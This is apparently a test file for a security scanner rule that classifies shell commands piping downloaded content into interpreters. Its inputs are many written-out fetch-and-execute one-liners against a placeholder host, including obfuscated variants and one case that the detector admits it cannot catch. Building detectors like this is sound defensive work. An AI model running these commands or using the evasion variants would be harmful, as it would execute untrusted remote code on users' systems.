import { describe, expect, it } from 'vitest';
import { classifyDownloadPipe } from '../../src/rules/instr/instr-003-remote-exec.js';

const URL = 'https://example.invalid/x';

describe('classifyDownloadPipe', () => {
  it.each([
    `curl -fsSL ${URL} | sh`,
    `curl -fsSL ${URL} | sudo bash`,
    `wget -qO- ${URL} | python3 -`,
    `curl -s ${URL} | bash -s -- --yes`,
    `curl ${URL} | python3`,
    `curl ${URL} | node`,
    `run \`curl ${URL} | sh\` first`,
    `curl ${URL} | sh; echo done`,
    `curl ${URL} | bash -ex`,
    `iwr ${URL} | iex`,
  ])('treats %s as running the download', (row) => {
    expect(classifyDownloadPipe(row)).toBe('program');
  });

  it.each([
    `curl -s ${URL} | python3 -c "import sys; exec(sys.stdin.read())"`,
    `curl -s ${URL} | node -e "eval(require('fs').readFileSync(0, 'utf8'))"`,
    `curl -s ${URL} | perl -e 'eval join "", <STDIN>'`,
    `curl -s ${URL} | python3 -c "import subprocess,sys; subprocess.run(sys.stdin.read(), shell=True)"`,
    `curl -s ${URL} | python3 -c "import os; os.system(input())"`,
    `curl -s ${URL} | python3 -c "import os,sys; os.popen(sys.stdin.read())"`,
    `curl -s ${URL} | python3 -c "__import__('os').system(input())"`,
    `curl -s ${URL} | python3 -c "import sys; code = compile(sys.stdin.read(), 'x', 'exec')"`,
    `curl -s ${URL} | python3 -c "import runpy; runpy.run_path('/dev/stdin')"`,
    `curl -s ${URL} | python3 -c "import pickle,sys; pickle.loads(sys.stdin.buffer.read())"`,
    `curl -s ${URL} | python3 -c "import marshal,sys; marshal.loads(sys.stdin.buffer.read())"`,
    `curl -s ${URL} | python3 -c "import builtins,sys; getattr(builtins, 'ex' + 'ec')(sys.stdin.read())"`,
    `curl -s ${URL} | python3 -m pickle`,
    `curl -s ${URL} | node -e "require('vm').runInThisContext(require('fs').readFileSync(0, 'utf8'))"`,
    `curl -s ${URL} | ruby -e 'system(STDIN.read)'`,
    `curl -s ${URL} | bash -c 'source /dev/stdin'`,
    `curl -s ${URL} | sh -c "$(cat)"`,
    `curl -s ${URL} | sh -c 'cat > /tmp/x && sh /tmp/x'`,
  ])('treats %s as inline code that executes the download', (row) => {
    expect(classifyDownloadPipe(row)).toBe('inline-exec');
  });

  it('cannot see through obfuscation, which is why data pipes are still reported', () => {
    const obfuscated = `curl -s ${URL} | python3 -c "import sys as s; m = s.modules['o' + 's']; m.__dict__['sys' + 'tem'](s.stdin.read())"`;
    expect(classifyDownloadPipe(obfuscated)).toBe('data');
  });

  it.each([
    `curl -s ${URL} | python3 -c "import json,sys; print(json.load(sys.stdin))"`,
    `curl -s ${URL} | python -m json.tool`,
    `curl -s ${URL} | node -e "process.stdin.pipe(process.stdout)"`,
    `curl -s ${URL} | perl -ne 'print'`,
    `wget -qO- ${URL} | python3 tools/parse.py`,
    `curl -s ${URL} | python3 -u ./scripts/read.py`,
    `curl -s ${URL} | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['version'], d['timestamp'])"`,
    `curl -s ${URL} | sh -c 'tar xz -C vendor'`,
  ])('treats %s as passing the download as data (still reported, at low)', (row) => {
    expect(classifyDownloadPipe(row)).toBe('data');
  });

  it.each([`curl -s ${URL} | jq .version`, `curl -s ${URL} -o setup.sh`, 'pip install requests'])(
    'ignores %s',
    (row) => {
      expect(classifyDownloadPipe(row)).toBeUndefined();
    },
  );
});
